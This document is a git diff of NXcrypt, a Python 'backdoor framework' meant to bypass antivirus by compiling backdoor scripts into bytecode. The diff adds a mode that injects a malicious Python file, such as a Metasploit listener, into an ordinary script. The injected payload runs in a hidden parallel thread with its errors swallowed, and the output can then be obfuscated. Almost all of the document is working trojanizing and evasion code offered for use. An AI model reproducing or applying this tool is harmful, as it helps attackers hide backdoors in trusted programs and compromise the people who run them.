@@ -1,13 +1,22 @@
 #!/usr/bin/python2
 #! coding : utf-8
 
-""" 
+"""
 
 Usage :
 
-sudo ./nxcrypt.py --file=file_to_encrypt.py 
+# encrypt a python file
+
+sudo ./nxcrypt.py --file=file_to_encrypt.py
 sudo ./nxcrypt.py --file=file_to_encrypt.py --output=output_file.py
-sudo ./nxcrypt.py --help 
+
+# inject a malicious python file into a normal python file
+
+sudo ./nxcrypt --file=normal_file.py --backdoor-file=msf_listener.py --output=test.py
+
+
+/* when you will execute the file 'test.py' the file 'normal_file.py' will be executed in the same time with
+ the file 'msf_listener.py' with multi-threading system */
 
 """
 
@@ -253,7 +262,7 @@ NcPjjBvjld4EM+nuFCY6C62819jmD/jQ2FzA5hMiPne4tGb+JLO5cAg=
 """
 stringo = [rsa,rsa1,lorem,text]
 _output_ = "backdoor.py" # edit this line is you want edit default output .
-_byte_ = (_output_) + "c"
+_byte_ = (_output_) + "c" # bytecode format
 
 # if platform is linux and NXcrypt isn't launched  as root
 if (sys.platform.startswith("linux")) :
@@ -264,13 +273,13 @@ if (sys.platform.startswith("linux")) :
 		pass
 else:
     pass
- 
+
 
 d = 1
 p = random.randint(9,20)
 
 
-#menu     
+#menu
 menu = """
 
 d8b   db db    db  .o88b. d8888b. db    db d8888b. d888888b
@@ -279,34 +288,49 @@ d8b   db db    db  .o88b. d8888b. db    db d8888b. d888888b
 88 V8o88  .dPYb.  8b      88`8b      88    88~~~      88
 88  V888 .8P  Y8. Y8b  d8 88 `88.    88    88         88
 VP   V8P YP    YP  `Y88P' 88   YD    YP    88         YP
-                                        (python backdoor encryption tool) 
+                                        (python backdoor framework)
 
-                                        Version 2.0
-                                        Codename 'Trojan Rabbit'
+                                        Version 3.0
+                                        Codename 'WannaLaugh'
 
 
        """
 menu_linux = "\033[32m" + (menu) + "\033[37m"
-      
+
 name = """
- -NXcrypt is a tool for bypass AV 
- -It encrypt 'python backdoors' in bytecode
- -Author: Hadi Mene (H4d3s)
-- Suspicious Shell Activity Labs
- 
+------------------------------------------------
+|                                              |
+| -NXcrypt functionnalities                    |
+|      - python backdoor encryption            |
+|      - backdooring python file  with         |
+|        a malicious python file               |
+|                                              |
+| -Author: Hadi Mene (H4d3s)                   |
+| -Credits : Suspicious Shell Activity         |
+|                                              |
+| -Contact author :                            |
+| 		[FB] Hadi Mene                 |
+------------------------------------------------
 	   """
-	   
+
 name_linux = "\033[31m" +  (name) + "\033[37m"
 
-#options 
+#options
+
 parser = optparse.OptionParser()
-parser.add_option("--file", "-f", help="python file to encrypt ", action="store", dest="file")
-parser.add_option("--output", "-o", help="output of crypted python file ", dest="out", action="store")
+parser.add_option("--file", "-f", help="python file  ", action="store", dest="file")
+parser.add_option("--output", "-o", help="output of python file ", dest="out", action="store")
+parser.add_option("--backdoor-file","-b",help="malicious python file to inject into normal file with multi-threading system",action="store",dest="backdoor")
+
 option , arg = parser.parse_args()
 if not option.file :
-	parser.error("file to encrypt hasn't given type --help for help ")
+
+	parser.error("python file hasn't given type --help for help ")
 	sys.exit()
-elif  option.file :
+
+
+elif  option.file and not option.backdoor :
+
 	payload = (option.file)
 
 	didi = open(payload,'r')
@@ -333,9 +357,9 @@ elif  option.file :
 	while (d) != (p) :
 		india.write(random.choice(stringo))
 		d += 1
-	india.close()  
+	india.close()
 
-	
+
 	if (sys.platform.startswith("linux")) :
 		print (menu_linux)
 		print ("")
@@ -345,7 +369,7 @@ elif  option.file :
 		print ("")
 		print (name)
 
-	if not option.out :	
+	if not option.out :
 		try:
 			py_compile.compile(payload, cfile=_byte_, dfile=None, doraise=False, ) #compilation
 		except (py_compile.PyCompileError,IOError,TypeError) :
@@ -357,13 +381,11 @@ elif  option.file :
 
 		elif (sys.platform.startswith("windows")) :
 			os.system(" rename {} {} ".format(_byte_,_output_))
-			
+
 		elif (sys.platform.startswith("darwin")):
 			os.system(" mv {}  {} ".format(_byte_,_output_))
 
-		print ("[+] encryption finished  100% ")
-		print time.strftime('[*] time : %H:%M ',time.localtime()) 
-		print time.strftime('[*] date :%d/%m/%y ',time.localtime())
+		print ("[+] encryption finished")
 		print ("[+] file : {} ".format(_output_))
 	elif option.out  :
 		output = option.out
@@ -379,10 +401,73 @@ elif  option.file :
 		elif (sys.platform.startswith("windows")):
 			os.system("rename {}  {} ".format(bytecode,output))
 		elif (sys.platform.startswith("darwin")):
-			os.system("mv {}  {} ".format(bytecode,output))	
-		
-		print ("[+] encryption finished 100% ")
-		print time.strftime('[*] time : %H:%M ',time.localtime()) 
-		print time.strftime('[*] date :%d/%m/%y ',time.localtime())
-		print ("[*] file : {} ".format(output))	
+			os.system("mv {}  {} ".format(bytecode,output))
 
+		print ("[+] encryption finished  ")
+		print ("[*] file : {} ".format(output))
+
+elif (option.backdoor) :
+	if (sys.platform.startswith("linux")) :
+		print (menu_linux)
+		print ("")
+		print (name_linux)
+	else:
+		print (menu)
+		print ("")
+		print (name)
+
+	if (option.out) :
+		_output_ = (option.out)
+
+	else:
+		pass
+	print ("[*] Injecting malicious file '{}' into '{}' and output will be '{}' ...".format(option.backdoor,option.file,_output_))
+	time.sleep(2)
+	try:
+		file_to_write = open(option.file,'r').read()
+	except :
+		sys.exit("[-] cannot read file {}".format(option.file))
+	try:
+		backdoor_to_write = open(option.backdoor,'r').read()
+	except :
+		sys.exit("[-]) cannot read file {}".format(option.backdoor))
+
+	hm = open(_output_,'w')
+	hm.write("#!/usr/bin/python3\nimport threading\n")
+	hm.write("def fcb():\n")
+	for lines in (file_to_write.split("\n")) :
+		hm.write("\t"+(lines)+"\n")
+	hm.write("def rma():\n")
+	hm.write("\t"+"try:")
+	for haha in (backdoor_to_write.split("\n")):
+		hm.write("\t"+"\t"+(haha)+"\n")
+	hm.write("\texcept:\n")
+	hm.write("\t\tpass\n")
+	hm.write("thread_1 = threading.Thread(target=fcb)\n")
+	hm.write("thread_2 = threading.Thread(target=rma)\n")
+	hm.write("thread_1.start()\n")
+	hm.write("thread_2.start()\n")
+	hm.close()
+	print("[+] Injection finished ")
+	print("[*] Output : {} ".format(_output_))
+
+	question = raw_input("Do you want  encrypt (obfuscate) the output [y/n] ? ")
+	if (question.lower()) == "y" :
+		py_compile.compile(_output_, cfile=(_output_)+"c", dfile=None, doraise=False, )
+		if (sys.platform.startswith("linux")):
+			os.system("mv {}  {} ".format(_output_+"c",_output_))
+		elif (sys.platform.startswith("windows")):
+			os.system("rename {}  {} ".format(_output_+"c",_output_))
+		elif (sys.platform.startswith("darwin")):
+			os.system("mv {}  {} ".format(_output_+"c",_output_))
+		else:
+			pass
+		if (sys.platform.startswith("linux")):
+			os.system("chmod +x {}".format(_output_))
+		else:
+			pass
+
+		print("[+] encryption finished ")
+
+	else:
+		sys.exit()
